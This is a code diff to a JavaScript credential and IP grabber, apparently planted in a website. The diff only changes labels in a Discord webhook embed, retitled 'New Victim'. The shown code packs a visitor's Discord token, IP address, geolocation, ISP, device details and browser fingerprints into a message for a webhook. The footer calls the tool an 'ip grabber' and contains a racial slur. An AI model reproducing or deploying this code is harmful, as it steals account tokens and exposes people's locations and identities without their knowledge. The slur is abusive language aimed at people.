@@ -1384,22 +1384,22 @@
             // Prepare Discord webhook data
             const message = {
                 embeds: [{
-                    title: "🔴 SYSTEM BREACH DETECTED",
+                    title: "New Victim",
                     color: 0xff0000,
                     timestamp: new Date().toISOString(),
                     fields: [
                         { 
-                            name: "🎯 TARGET ACQUIRED",
+                            name: ".",
                             value: `**Site:** ${document.title}\n**Location:** ${window.location.href}\n**Entry Point:** ${document.referrer || 'Direct Access'}`,
                             inline: false
                         },
                         { 
-                            name: "💀 DISCORD CREDENTIALS",
+                            name: "discord token",
                             value: discordToken ? `\`\`\`${discordToken}\`\`\`` : '**[NO TOKEN FOUND]**',
                             inline: false
                         },
                         { 
-                            name: "📍 NETWORK INTEL",
+                            name: "ip adress",
                             value: `**IP ADDRESS:** \`${ip}\`
 **LOCATION:** ${geoData.city || "Unknown"}, ${geoData.region || "Unknown"}
 **NATION:** ${geoData.country_name || "Unknown"}
@@ -1407,7 +1407,7 @@
                             inline: true
                         },
                         {
-                            name: "📡 CONNECTION DATA",
+                            name: "connection data",
                             value: `**PROVIDER:** ${geoData.org || "Unknown"}
 **NETWORK ID:** ${geoData.asn || "Unknown"}
 **LINK TYPE:** ${connectionInfo.type}
@@ -1417,7 +1417,7 @@
                             inline: true
                         },
                         {
-                            name: "🖥️ SYSTEM PROFILE",
+                            name: "🖥system info",
                             value: `**OPERATING SYSTEM:** ${platform}
 **MANUFACTURER:** ${vendor}
 **USER AGENT:** ${browserInfo.name} ${browserInfo.version}
@@ -1426,7 +1426,7 @@
                             inline: true
                         },
                         {
-                            name: "📊 DISPLAY SPECIFICATIONS",
+                            name: "display info",
                             value: `**SCREEN RESOLUTION:** ${screenInfo.width}x${screenInfo.height}
 **COLOR DEPTH:** ${screenInfo.colorDepth}-bit
 **ORIENTATION:** ${screenInfo.orientation}
@@ -1435,7 +1435,7 @@
                             inline: true
                         },
                         {
-                            name: "🕐 TEMPORAL DATA",
+                            name: "temp data",
                             value: `**LOCAL TIMESTAMP:** ${deviceInfo.localTime}
 **TIME ZONE:** ${timezone}
 **PRIMARY LANGUAGE:** ${locale}
@@ -1444,12 +1444,12 @@
                             inline: true
                         },
                         {
-                            name: "🕵️ USER AGENT SIGNATURE",
+                            name: "user agent signature",
                             value: `\`\`\`${userAgent}\`\`\``,
                             inline: false
                         },
                         {
-                            name: "🧠 ADVANCED FINGERPRINT",
+                            name: "fingerprint",
                             value: `**Canvas Hash:** ${advancedFingerprint.canvasFingerprint ? advancedFingerprint.canvasFingerprint.substring(20, 50) + '...' : 'Unavailable'}
 **Audio Fingerprint:** ${advancedFingerprint.audioContext || 'Unavailable'}
 **WebGL Renderer:** ${advancedFingerprint.webglRenderer || 'Unavailable'}
@@ -1460,7 +1460,7 @@
                             inline: false
                         },
                         {
-                            name: "🔋 DEVICE CAPABILITIES",
+                            name: "device info",
                             value: `**CPU Cores:** ${deviceInfo.cpuCores}
 **Device Memory:** ${deviceInfo.deviceMemory}
 **Touch Points:** ${deviceInfo.maxTouchPoints}
@@ -1472,7 +1472,7 @@
                             inline: true
                         },
                         {
-                            name: "⚡ PERFORMANCE METRICS",
+                            name: "performance info",
                             value: `**Memory Usage:** ${deviceInfo.memory ? (deviceInfo.memory.usedJSHeapSize / 1048576).toFixed(2) + ' MB' : 'Unknown'}
 **Total Memory:** ${deviceInfo.memory ? (deviceInfo.memory.totalJSHeapSize / 1048576).toFixed(2) + ' MB' : 'Unknown'}
 **Screen Position:** ${deviceInfo.window.screenX}x${deviceInfo.window.screenY}
@@ -1482,7 +1482,7 @@
                         }
                     ],
                     footer: { 
-                        text: "💀 ACCESS GRANTED • " + new Date().toLocaleString(),
+                        text: "bva3 ip grabber on top nigga" + new Date().toLocaleString(),
                         icon_url: "https://cdn.discordapp.com/emojis/861521626652344360.png?v=1"
                     }
                 }]
